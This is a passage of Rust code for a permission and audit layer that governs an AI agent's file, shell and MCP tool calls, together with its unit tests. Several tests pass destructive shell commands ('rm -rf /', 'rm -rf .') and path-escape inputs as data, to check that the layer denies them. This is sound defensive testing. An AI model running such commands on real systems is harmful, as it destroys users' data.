        let (path, pre_image_sha256, pre_image_note) = self.pre_image(&req.tool, &req.input).await;
        let receipt = MutationReceipt {
            event_type: "tool_mutation",
            ts_ms,
            tool: req.tool.clone(),
            call_id: req.call_id.clone(),
            risk_class: risk_label.to_string(),
            path,
            pre_image_sha256,
            pre_image_note,
            detail,
            outcome,
        };
        match self.receipts.record(receipt) {
            Ok(()) => Ok(()),
            Err(e) => {
                tracing::warn!(
                    tool = %req.tool,
                    call_id = %req.call_id,
                    error = %e,
                    "toolhost receipt write failed — denying mutation"
                );
                Err(ToolHostError::Denied("receipt_write_failed".into()))
            }
        }
    }

    /// (B4) The target path + pre-image SHA-256 for the receipt. For write/edit,
    /// reads the existing target within the edit byte cap and hashes it; for a
    /// too-large / absent / unreadable target it records a note and no hash. For
    /// bash there is no single target — `("not_applicable")`.
    async fn pre_image(
        &self,
        tool: &str,
        input: &Value,
    ) -> (Option<String>, Option<String>, Option<&'static str>) {
        if !matches!(tool, "write" | "edit") {
            return (None, None, Some("not_applicable"));
        }
        let Some(path) = input.get("path").and_then(Value::as_str) else {
            return (None, None, Some("absent"));
        };
        use fluers_runtime::RuntimeError;
        match self
            .env
            .read_file_full(std::path::Path::new(path), Limits::default().max_edit_bytes)
            .await
        {
            Ok(content) => (
                Some(path.to_string()),
                Some(crate::toolhost::receipts::sha256_hex(content.as_bytes())),
                None,
            ),
            // Exists but exceeds the cap — record without hashing (bounded read).
            Err(RuntimeError::FileTooLarge { .. }) => {
                (Some(path.to_string()), None, Some("too_large"))
            }
            // Not found ⇒ a fresh create (no pre-image); other errors ⇒ unreadable.
            Err(RuntimeError::Io(e)) if e.kind() == std::io::ErrorKind::NotFound => {
                (Some(path.to_string()), None, Some("absent"))
            }
            Err(_) => (Some(path.to_string()), None, Some("unreadable")),
        }
    }

    /// (Phase G3) The governed gate for an `mcp:<server>:<tool>` call. MCP servers
    /// are external trusted subprocesses — the OS jail does NOT confine them — so
    /// the entire gate is: catalog live, an `OwnerInteractive`/`Delegated` origin,
    /// the `Scope::McpInvoke` scope, and a declared + allowlisted tool. Every
    /// decision produces an audit row stamped `isolation:"external"` (honest: not
    /// `host`/`jailed`); an allowed call also records a mutation-style receipt
    /// naming the server BEFORE the external process is invoked.
    async fn execute_mcp(&self, req: &ToolHostRequest) -> Result<ToolHostResult, ToolHostError> {
        let now_ms = self.clock.now_ms();
        let deny = |reason: &str| -> Result<ToolHostResult, ToolHostError> {
            if let Err(err) = self.audit.record(ToolHostAuditRecord {
                event_type: "tool_policy",
                ts_ms: now_ms,
                tool: req.tool.clone(),
                call_id: req.call_id.clone(),
                decision: AuditDecision::Denied,
                reason: reason.into(),
                risk_class: "Mcp",
                isolation: MCP_ISOLATION_LABEL,
            }) {
                // Keep denying (correct), but surface the swallowed audit-write
                // failure loudly so a degrading store is visible.
                eprintln!(
                    "fae-daemon: toolhost MCP deny-path audit write FAILED (tool='{}', reason='{reason}'): {err}",
                    req.tool
                );
            }
            Err(ToolHostError::Denied(reason.into()))
        };

        // 1. Catalog must be live (owner declared servers).
        let Some(catalog) = self.mcp.as_ref() else {
            return deny("mcp_not_configured");
        };
        // 2. Origin: only an owner's interactive turn or a delegated loop. An
        //    autonomous origin (proactive/scheduler/auto-skill/script-block) must
        //    never reach an unconfined external process.
        if !matches!(
            req.origin,
            ToolOrigin::OwnerInteractive | ToolOrigin::Delegated
        ) {
            return deny("mcp_origin_forbidden");
        }
        // 3. Scope: the inner `Scope::McpInvoke` re-check (behind the outer
        //    `toolhost.execute -> ToolExecuteSafe` envelope).
        let scope_cmd = Command {
            v: PROTOCOL_VERSION,
            request_id: req.call_id.clone(),
            command: MCP_INVOKE_COMMAND.into(),
            payload: Value::Null,
        };
        if !matches!(
            authorize(&req.client, &scope_cmd, now_ms),
            AuthzDecision::Allow
        ) {
            return deny("missing_scope");
        }
        // 4. The tool must be declared + allowlisted (the catalog only holds
        //    allowlisted tools, so a lookup miss is a fail-closed deny).
        let Some(mtool) = catalog.get(&req.tool) else {
            return deny("mcp_tool_not_declared");
        };

        // 5. Fail-closed audit (allow) BEFORE any side effect.
        if self
            .audit
            .record(ToolHostAuditRecord {
                event_type: "tool_policy",
                ts_ms: now_ms,
                tool: req.tool.clone(),
                call_id: req.call_id.clone(),
                decision: AuditDecision::Allowed,
                reason: "allowed".into(),
                risk_class: "Mcp",
                isolation: MCP_ISOLATION_LABEL,
            })
            .is_err()
        {
            return Err(ToolHostError::Denied("audit_write_failed".into()));
        }
        // 6. Fail-closed receipt naming the external server BEFORE the invoke.
        let receipt = MutationReceipt {
            event_type: "tool_mutation",
            ts_ms: now_ms,
            tool: req.tool.clone(),
            call_id: req.call_id.clone(),
            risk_class: "Mcp".into(),
            path: None,
            pre_image_sha256: None,
            // No local pre-image: the side effect is external, not a file mutation.
            pre_image_note: Some("external"),
            detail: ConfirmDetail::Mcp {
                server: mtool.server.clone(),
                tool: mtool.tool.clone(),
            },
            outcome: "invoked",
        };
        if let Err(e) = self.receipts.record(receipt) {
            tracing::warn!(
                tool = %req.tool,
                call_id = %req.call_id,
                error = %e,
                "toolhost MCP receipt write failed — denying invocation"
            );
            return Err(ToolHostError::Denied("receipt_write_failed".into()));
        }

        // 7. Invoke the external server (bounded by the catalog's per-call timeout).
        match catalog.invoke(&req.tool, req.input.clone()).await {
            Ok(text) => Ok(ToolHostResult {
                output: ToolResult {
                    content: vec![Value::String(text)],
                    details: None,
                },
            }),
            Err(e) => Err(ToolHostError::Tool(e.to_string())),
        }
    }
}

#[cfg(test)]
impl ToolHost {
    /// Override the detected jail availability (to exercise the fail-closed
    /// path on a runner that actually has a backend).
    fn set_jail_available(&mut self, available: bool) {
        self.jail_available = available;
    }

    /// Override the resolved home dir WITHOUT mutating the process `HOME` env
    /// (which would race concurrent host-constructing tests under `cargo test`).
    /// Lets the C1+C2 host-bash test point the protected-read set at a hermetic
    /// temp home.
    fn set_home(&mut self, home: Option<String>) {
        self.home = home;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::toolhost::audit::CapturingAudit;
    use crate::toolhost::confirm::FakeConfirmation;
    use crate::toolhost::egress::{EgressDenyReason, FakeEgressGate};
    use fae_control_plane::{ClientClass, Scope};
    use fluers_core::ToolPolicy;
    use serde_json::json;

    /// A fixed clock for deterministic `now_ms` / audit timestamps.
    struct FixedClock;
    impl ToolHostClock for FixedClock {
        fn now_ms(&self) -> u64 {
            1_700_000_000_000
        }
    }

    fn client(scopes: &[Scope]) -> ClientRecord {
        ClientRecord {
            client_id: "test".into(),
            class: ClientClass::TestHarness,
            scopes: scopes.iter().cloned().collect(),
            issued_at_ms: 0,
            expires_at_ms: u64::MAX,
            revoked_at_ms: None,
            display_name: "Test".into(),
        }
    }

    fn gov(
        client: ClientRecord,
        audit: Arc<CapturingAudit>,
        egress: Arc<dyn ToolEgressGate>,
    ) -> Arc<ToolHostGovernance> {
        let audit_dyn: Arc<dyn ToolHostAudit> = audit;
        Arc::new(ToolHostGovernance {
            client,
            audit: audit_dyn,
            egress,
            now_ms: FixedClock.now_ms(),
            call_id: "call-1".into(),
            root_mode: crate::toolhost::policy::RootMode::TempSandbox,
            home: None,
            isolation: IsolationMode::Host,
        })
    }

    async fn check(
        client: ClientRecord,
        tool: &str,
        input: Value,
        audit: Arc<CapturingAudit>,
        egress: Arc<dyn ToolEgressGate>,
    ) -> fluers_core::PolicyVerdict {
        let g = gov(client, audit, egress);
        FaeToolPolicy::new(g).check(tool, &input, &ctx()).await
    }

    fn ctx() -> InvokeContext {
        InvokeContext {
            tool_call_id: "call-1".into(),
            cancel: CancellationToken::new(),
        }
    }

    // -----------------------------------------------------------------------
    // Scope + the §4.1 Confirm trap
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn safe_scope_allows_read_glob_grep() {
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe]);
        assert!(matches!(
            check(
                c.clone(),
                "read",
                json!({"path":"a.txt"}),
                Arc::clone(&audit),
                Arc::clone(&egress)
            )
            .await,
            fluers_core::PolicyVerdict::Allow
        ));
        assert!(matches!(
            check(
                c.clone(),
                "glob",
                json!({"pattern":"*.rs"}),
                Arc::clone(&audit),
                Arc::clone(&egress)
            )
            .await,
            fluers_core::PolicyVerdict::Allow
        ));
        assert!(matches!(
            check(c, "grep", json!({"pattern":"foo"}), audit, egress).await,
            fluers_core::PolicyVerdict::Allow
        ));
    }

    #[tokio::test]
    async fn missing_scope_denies_and_audits() {
        let audit = Arc::new(CapturingAudit::new());
        // Client with NO tool scopes.
        let c = client(&[]);
        let v = check(
            c,
            "read",
            json!({"path":"a.txt"}),
            Arc::clone(&audit),
            Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>,
        )
        .await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Deny(_)));
        let rows = audit.snapshot();
        assert_eq!(rows.len(), 1);
        assert_eq!(
            rows[0].decision,
            crate::toolhost::audit::AuditDecision::Denied
        );
        assert_eq!(rows[0].reason, "missing_scope");
    }

    #[tokio::test]
    async fn dangerous_confirm_required_maps_to_deny_not_confirm() {
        // §4.1 trap: a scoped dangerous tool gets ConfirmRequired from
        // authorize, which we MUST map to Deny (never Confirm).
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe, Scope::ToolExecuteDangerous]);
        let v = check(
            c,
            "bash",
            json!({"command":"echo hi"}),
            audit.clone(),
            egress,
        )
        .await;
        assert!(
            matches!(v, fluers_core::PolicyVerdict::Deny(_)),
            "dangerous + ConfirmRequired must Deny, got {v:?}"
        );
        // Crucially NOT Confirm:
        assert!(!matches!(v, fluers_core::PolicyVerdict::Confirm(_)));
        assert_eq!(
            audit.snapshot()[0].reason,
            "confirm_required_via_loop_bypass"
        );
    }

    #[tokio::test]
    async fn write_edit_bash_require_dangerous_scope() {
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        // Safe-only client → MissingScope for each dangerous tool.
        let c = client(&[Scope::ToolExecuteSafe]);
        for (tool, input) in [
            ("write", json!({"path":"a.txt","content":"x"})),
            (
                "edit",
                json!({"path":"a.txt","old_text":"a","new_text":"b"}),
            ),
            ("bash", json!({"command":"ls"})),
        ] {
            let v = check(
                c.clone(),
                tool,
                input,
                Arc::clone(&audit),
                Arc::clone(&egress),
            )
            .await;
            assert!(
                matches!(v, fluers_core::PolicyVerdict::Deny(_)),
                "{tool} must deny"
            );
        }
    }

    // -----------------------------------------------------------------------
    // PathPolicy (reachable for safe tools: read/glob/grep)
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn path_escape_denied_for_safe_read() {
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe]);
        let v = check(
            c,
            "read",
            json!({"path":"../escape.txt"}),
            audit.clone(),
            egress,
        )
        .await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Deny(r) if r == "path_escape"));
        assert_eq!(audit.snapshot()[0].reason, "path_escape");
    }

    #[tokio::test]
    async fn per_tool_extractor_catches_glob_pattern_and_grep_paths() {
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe]);
        // glob uses `pattern`, not `path` — the extractor must catch it.
        let v = check(
            c.clone(),
            "glob",
            json!({"pattern":"../**/*"}),
            Arc::clone(&audit),
            Arc::clone(&egress),
        )
        .await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Deny(_)));
        // grep uses `paths` — each entry checked.
        let v = check(
            c,
            "grep",
            json!({"pattern":"x","paths":["ok.txt","../bad"]}),
            audit,
            egress,
        )
        .await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Deny(_)));
    }

    #[tokio::test]
    async fn grep_without_paths_is_allowed() {
        // Owner watch-item (rev 3): absent `paths` is a legitimate path-less
        // search of the contained root — must NOT be denied.
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe]);
        let v = check(c, "grep", json!({"pattern":"foo"}), audit, egress).await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Allow));
    }

    // -----------------------------------------------------------------------
    // Egress gate (reachable: networked → safe scope)
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn networked_tool_denied_by_disabled_gate() {
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(DisabledGate) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe]);
        let v = check(
            c,
            "web_search",
            json!({"query":"clean"}),
            audit.clone(),
            egress,
        )
        .await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Deny(_)));
        assert_eq!(audit.snapshot()[0].reason, "egress_disabled");
    }

    #[tokio::test]
    async fn networked_tool_each_egress_deny_reason_audits_correctly() {
        let c = client(&[Scope::ToolExecuteSafe]);
        for (reason, want) in [
            (EgressDenyReason::ModeBlocked, "egress_mode_blocked"),
            (EgressDenyReason::NotProvisioned, "egress_not_provisioned"),
            (EgressDenyReason::PrivacyBlocked, "egress_privacy_blocked"),
        ] {
            let audit = Arc::new(CapturingAudit::new());
            let egress = Arc::new(FakeEgressGate::deny(reason)) as Arc<dyn ToolEgressGate>;
            let v = check(
                c.clone(),
                "fetch_url",
                json!({"url":"https://x"}),
                Arc::clone(&audit),
                egress,
            )
            .await;
            assert!(matches!(v, fluers_core::PolicyVerdict::Deny(_)), "{want}");
            assert_eq!(audit.snapshot()[0].reason, want);
        }
    }

    #[tokio::test]
    async fn networked_egress_allow_does_not_bypass_scope() {
        // A safe-scoped networked tool with an Allow gate is allowed by policy
        // (the gate IS its authorization). But a client WITHOUT safe scope is
        // denied at step 2 regardless of the gate.
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let audit = Arc::new(CapturingAudit::new());
        let v = check(
            client(&[]),
            "web_search",
            json!({"query":"x"}),
            audit,
            egress,
        )
        .await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Deny(_)));
    }

    // -----------------------------------------------------------------------
    // Unknown tool + audit invariants
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn unknown_tool_fails_closed() {
        let audit = Arc::new(CapturingAudit::new());
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe, Scope::ToolExecuteDangerous]);
        let v = check(c, "rm-rf", json!({}), audit.clone(), egress).await;
        assert!(matches!(v, fluers_core::PolicyVerdict::Deny(_)));
        assert_eq!(audit.snapshot()[0].reason, "unknown_tool");
    }

    #[tokio::test]
    async fn allow_path_audit_failure_denies() {
        // Fail-closed: if the audit write fails on the ALLOW path, deny.
        let audit = Arc::new(CapturingAudit::new());
        audit.set_failing();
        let egress = Arc::new(FakeEgressGate::allow()) as Arc<dyn ToolEgressGate>;
        let c = client(&[Scope::ToolExecuteSafe]);
        let v = check(c, "read", json!({"path":"a.txt"}), audit, egress).await;
        assert!(
            matches!(&v, fluers_core::PolicyVerdict::Deny(r) if r.starts_with("audit_write_failed")),
            "audit failure must deny, got {v:?}"
        );
    }

    // -----------------------------------------------------------------------
    // ToolHost::execute end-to-end (governed dispatch)
    // -----------------------------------------------------------------------

    use crate::toolhost::receipts::{CapturingReceipts, ToolHostReceipts};

    async fn fresh_host(
        audit: Arc<CapturingAudit>,
        egress: Arc<dyn ToolEgressGate>,
    ) -> (ToolHost, tempfile::TempDir) {
        let receipts = Arc::new(CapturingReceipts::new()) as Arc<dyn ToolHostReceipts>;
        fresh_host_with_receipts(
            audit,
            receipts,
            egress,
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await
    }

    async fn fresh_durable_host(
        audit: Arc<CapturingAudit>,
        egress: Arc<dyn ToolEgressGate>,
    ) -> (ToolHost, tempfile::TempDir) {
        // A ToolHost bound to a DURABLE root (RootMode::DurableWorkspace) — the
        // workspace-wipe damage control is active. The "project" is a real
        // tempdir (treated as a durable workspace for the test).
        let receipts = Arc::new(CapturingReceipts::new()) as Arc<dyn ToolHostReceipts>;
        fresh_host_with_receipts(
            audit,
            receipts,
            egress,
            crate::toolhost::policy::RootMode::DurableWorkspace,
        )
        .await
    }

    /// A host with an explicit receipts sink (B4 tests capture/fail it).
    async fn fresh_host_with_receipts(
        audit: Arc<CapturingAudit>,
        receipts: Arc<dyn ToolHostReceipts>,
        egress: Arc<dyn ToolEgressGate>,
        root_mode: crate::toolhost::policy::RootMode,
    ) -> (ToolHost, tempfile::TempDir) {
        let dir = tempfile::tempdir().expect("tempdir");
        let audit_dyn: Arc<dyn ToolHostAudit> = audit;
        let host = ToolHost::with_wiring(
            dir.path().to_path_buf(),
            Limits::default(),
            audit_dyn,
            receipts,
            egress,
            Arc::new(FixedClock),
            root_mode,
        )
        .await
        .expect("host");
        (host, dir)
    }

    #[tokio::test]
    async fn execute_runs_allowed_read_tool() {
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        // Write a file via the env first, then read it through the host.
        host.env
            .write_file(std::path::Path::new("greet.txt"), "hi")
            .await
            .expect("write");
        let req = ToolHostRequest {
            client: client(&[Scope::ToolExecuteSafe]),
            tool: "read".into(),
            input: serde_json::json!({"path":"greet.txt"}),
            call_id: "c1".into(),
            cancel: CancellationToken::new(),
            origin: ToolOrigin::OwnerInteractive,
            security_override: None,
            network_denied: false,
        };
        let res = host.execute(req).await.expect("allowed + ran");
        assert!(!res.output.content.is_empty());
        // Exactly one allow audit row.
        assert_eq!(audit.snapshot().len(), 1);
        assert_eq!(
            audit.snapshot()[0].decision,
            crate::toolhost::audit::AuditDecision::Allowed
        );
    }

    #[tokio::test]
    async fn execute_denies_without_dispatching() {
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let req = ToolHostRequest {
            client: client(&[]), // no scopes
            tool: "read".into(),
            input: serde_json::json!({"path":"a.txt"}),
            call_id: "c2".into(),
            cancel: CancellationToken::new(),
            origin: ToolOrigin::OwnerInteractive,
            security_override: None,
            network_denied: false,
        };
        let err = host.execute(req).await.unwrap_err();
        assert!(matches!(err, ToolHostError::Denied(_)));
        // A deny audit row was written.
        assert_eq!(audit.snapshot().len(), 1);
        assert_eq!(audit.snapshot()[0].reason, "missing_scope");
    }

    // -----------------------------------------------------------------------
    // A3 execute_governed: the confirmation channel (scope §6)
    // -----------------------------------------------------------------------

    fn dangerous_client() -> ClientRecord {
        client(&[Scope::ToolExecuteSafe, Scope::ToolExecuteDangerous])
    }

    fn req(client: ClientRecord, tool: &str, input: Value) -> ToolHostRequest {
        req_origin(client, tool, input, ToolOrigin::OwnerInteractive)
    }

    fn req_origin(
        client: ClientRecord,
        tool: &str,
        input: Value,
        origin: ToolOrigin,
    ) -> ToolHostRequest {
        ToolHostRequest {
            client,
            tool: tool.into(),
            input,
            call_id: "call-1".into(),
            cancel: CancellationToken::new(),
            origin,
            security_override: None,
            network_denied: false,
        }
    }

    #[tokio::test]
    async fn governed_safe_read_runs_without_confirm() {
        // A safe tool (read) takes the Allow path — no confirmation asked.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        host.env
            .write_file(std::path::Path::new("a.txt"), "hi")
            .await
            .expect("write");
        let conf = FakeConfirmation::approve();
        let r = host
            .execute_governed(
                req(
                    client(&[Scope::ToolExecuteSafe]),
                    "read",
                    json!({"path":"a.txt"}),
                ),
                &conf,
            )
            .await
            .expect("allowed + ran");
        assert!(!r.output.content.is_empty());
        assert!(!conf.was_called(), "safe read must not prompt");
        assert_eq!(audit.snapshot()[0].reason, "allowed");
    }

    #[tokio::test]
    async fn governed_write_approved_executes_and_audits() {
        // A dangerous write: confirm→approve→runs; audit reason is the confirmed marker.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        host.execute_governed(
            req(
                dangerous_client(),
                "write",
                json!({"path":"out.txt","content":"hello"}),
            ),
            &conf,
        )
        .await
        .expect("approved + ran");
        assert!(conf.was_called(), "dangerous write must prompt");
        // The file was actually written to the sandbox root.
        let written = host
            .env
            .read_file_full(std::path::Path::new("out.txt"), 1024)
            .await
            .expect("file exists");
        assert_eq!(written, "hello");
        // The audit row records the owner's confirmation, not a bare allow.
        assert_eq!(audit.snapshot()[0].decision, AuditDecision::Allowed);
        assert_eq!(audit.snapshot()[0].reason, "confirmed_by_owner");
    }

    #[tokio::test]
    async fn governed_dangerous_tool_without_scope_denies_without_prompting() {
        // Server-side dangerous-scope gate (A3-Swift advisor focus + reviewer
        // focus): a client holding ONLY ToolExecuteSafe must NOT be able to run
        // write/edit/bash — even with a confirmation channel that would approve.
        // The gate is enforced inside evaluate() via the inner
        // authorize("tool.execute_dangerous") call against the SERVER's
        // ClientRecord.scopes (not a client claim); client-side opt-in is NOT
        // the security boundary. This proves dangerous execution requires BOTH
        // the ToolExecuteDangerous scope AND an owner confirm.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        // A FakeConfirmation that WOULD approve if asked — to prove the gate
        // denies BEFORE the confirm round-trip is ever initiated.
        let conf = FakeConfirmation::approve();
        for (tool, input) in [
            ("write", json!({"path":"out.txt","content":"x"})),
            (
                "edit",
                json!({"path":"a.txt","old_text":"a","new_text":"b"}),
            ),
            ("bash", json!({"command":"echo hi"})),
        ] {
            let r = host
                .execute_governed(req(client(&[Scope::ToolExecuteSafe]), tool, input), &conf)
                .await;
            match r {
                Err(ToolHostError::Denied(reason)) => {
                    assert!(
                        reason.contains("scope"),
                        "{tool} should deny on missing dangerous scope, got: {reason}"
                    );
                }
                other => panic!("{tool} with safe-only client must deny, got {other:?}"),
            }
        }
        // Crucially: the owner was NEVER prompted (the gate ran before confirm).
        assert!(
            !conf.was_called(),
            "a safe-only client must never be prompted for a dangerous tool"
        );
        // And no file was written to the sandbox.
        let wrote = host
            .env
            .read_file_full(std::path::Path::new("out.txt"), 1)
            .await
            .is_ok();
        assert!(
            !wrote,
            "write must not have executed without the dangerous scope"
        );
    }

    #[tokio::test]
    async fn governed_write_denied_does_not_execute() {
        // confirm→deny: the tool must NOT run.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::deny();
        let err = host
            .execute_governed(
                req(
                    dangerous_client(),
                    "write",
                    json!({"path":"out.txt","content":"x"}),
                ),
                &conf,
            )
            .await
            .expect_err("must deny");
        assert!(matches!(err, ToolHostError::Denied(_)), "{err:?}");
        // The file was NOT written.
        assert!(
            host.env
                .read_file_full(std::path::Path::new("out.txt"), 1)
                .await
                .is_err(),
            "denied write must not create the file"
        );
        assert_eq!(audit.snapshot()[0].decision, AuditDecision::Denied);
    }

    #[tokio::test]
    async fn governed_write_path_escape_denies_without_prompting() {
        // §6.2: a path-escaping write denies BEFORE the owner is prompted.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve(); // would approve if asked — it must NOT be asked
        let err = host
            .execute_governed(
                req(
                    dangerous_client(),
                    "write",
                    json!({"path":"../escape.txt","content":"x"}),
                ),
                &conf,
            )
            .await
            .expect_err("must deny");
        assert!(matches!(err, ToolHostError::Denied(_)));
        assert!(
            !conf.was_called(),
            "path-escape write must deny WITHOUT prompting"
        );
        assert_eq!(audit.snapshot()[0].reason, "path_escape");
    }

    #[tokio::test]
    async fn governed_bash_catastrophic_denies_without_prompting() {
        // §6.2: a catastrophic bash denies BEFORE the owner is prompted.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req(dangerous_client(), "bash", json!({"command":"rm -rf /"})),
                &conf,
            )
            .await
            .expect_err("must deny");
        assert!(matches!(err, ToolHostError::Denied(_)));
        assert!(
            !conf.was_called(),
            "catastrophic bash must deny WITHOUT prompting"
        );
        assert_eq!(audit.snapshot()[0].reason, "damage_control");
    }

    // --- A3→B: durable-root workspace-wipe damage control ---

    #[tokio::test]
    async fn durable_workspace_wipe_denies_without_prompting() {
        // Under a DURABLE root, `rm -rf .` is catastrophic (real files) and
        // denies BEFORE the confirm (scope §6.2). A FakeConfirmation that WOULD
        // approve proves the gate ran first.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) =
            fresh_durable_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(
                req(dangerous_client(), "bash", json!({"command":"rm -rf ."})),
                &conf,
            )
            .await
            .expect_err("workspace wipe must deny");
        match err {
            ToolHostError::Denied(reason) => {
                assert_eq!(reason, "workspace_wipe_blocked", "got: {reason}")
            }
            other => panic!("expected Denied(workspace_wipe_blocked), got {other:?}"),
        }
        assert!(
            !conf.was_called(),
            "workspace wipe must deny WITHOUT prompting"
        );
        assert_eq!(audit.snapshot()[0].reason, "workspace_wipe_blocked");
    }

    #[tokio::test]
    async fn durable_scoped_delete_proceeds_to_confirm() {
        // A scoped subdir delete is NOT a workspace wipe → it reaches the confirm.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) =
            fresh_durable_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        host.execute_governed(
            req(
                dangerous_client(),
                "bash",
                json!({"command":"rm -rf ./target/debug"}),
            ),
            &conf,
        )
        .await
        .expect("scoped delete should proceed + run after confirm");
        assert!(conf.was_called(), "a scoped delete must reach the confirm");
    }

    #[tokio::test]
    async fn temp_mode_workspace_wipe_is_not_blocked() {
        // Under the TEMP sandbox, `rm -rf .` is harmless (deleted on close) — the
        // workspace-wipe gate does NOT apply. It reaches the confirm normally.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(Arc::clone(&audit), Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        host.execute_governed(
            req(dangerous_client(), "bash", json!({"command":"rm -rf ."})),
            &conf,
        )
        .await
        .expect("temp-mode wipe should proceed (not blocked by workspace_wipe)");
        assert!(conf.was_called(), "temp-mode wipe reaches the confirm");
    }

    #[tokio::test]
    async fn governed_confirm_payload_carries_no_file_content() {
        // §6.3 / owner Q3: the confirm payload is bounded + redacted — the file
        // CONTENT must never reach the confirmation channel.
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(audit, Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::deny(); // deny so nothing runs; we only inspect the request
        let _ = host
            .execute_governed(
                req(
                    dangerous_client(),
                    "write",
                    json!({"path":"out.txt","content":"SECRET-SENTINEL-DO-NOT-ECHO"}),
                ),
                &conf,
            )
            .await;
        let creq = conf.last_request().expect("confirm was called");
        let serialized = serde_json::to_string(&creq).expect("serialize");
        assert!(
            !serialized.contains("SECRET-SENTINEL-DO-NOT-ECHO"),
            "file content leaked into confirm payload: {serialized}"
        );
    }

    #[tokio::test]
    async fn governed_unknown_tool_denies_without_prompting() {
        let audit = Arc::new(CapturingAudit::new());
        let (host, _dir) = fresh_host(audit, Arc::new(FakeEgressGate::allow())).await;
        let conf = FakeConfirmation::approve();
        let err = host
            .execute_governed(req(dangerous_client(), "nope", json!({})), &conf)
            .await
            .expect_err("must deny");
        assert!(matches!(err, ToolHostError::Denied(_)));
        assert!(!conf.was_called());
    }

    // -----------------------------------------------------------------------
    // B4: mutation receipts
    // -----------------------------------------------------------------------

    #[tokio::test]
    async fn receipt_written_on_write_with_pre_image_hash() {
        // An approved write to an EXISTING file records a receipt whose
        // pre_image_sha256 is the hash of the pre-mutation content.
        let audit = Arc::new(CapturingAudit::new());
        let receipts = Arc::new(CapturingReceipts::new());
        let (host, _dir) = fresh_host_with_receipts(
            audit,
            Arc::clone(&receipts) as Arc<dyn ToolHostReceipts>,
            Arc::new(FakeEgressGate::allow()),
            crate::toolhost::policy::RootMode::TempSandbox,
        )
        .await;
        host.env
            .write_file(std::path::Path::new("out.txt"), "OLD")
            .await
            .expect("seed");
        let conf = FakeConfirmation::approve();
        host.execute_governed(
            req(
                dangerous_client(),
                "write",
                json!({"path":"out.txt","content":"NEW"}),
            ),
            &conf,
        )
        .await
        .expect("approved + ran");
        let snap = receipts.snapshot();
        assert_eq!(snap.len(), 1, "exactly one mutation receipt");
        let r = &snap[0];
        assert_eq!(r.tool, "write");
        assert_eq!(r.outcome, "confirmed_by_owner");
        assert_eq!(r.path.as_deref(), Some("out.txt"));
        assert_eq!(
            r.pre_image_sha256.as_deref(),
            Some(crate::toolhost::receipts::sha256_hex(b"OLD").as_str()),
            "pre-image hash must be of the OLD content, not the NEW write"
        );
        assert!(r.pre_image_note.is_none());
    }

    #[tokio::test]
    async fn receipt_write_failure_blocks_the_mutation() {
        // Fail-closed: if the receipt cannot be written, the write is DENIED and
        // the file is never created.
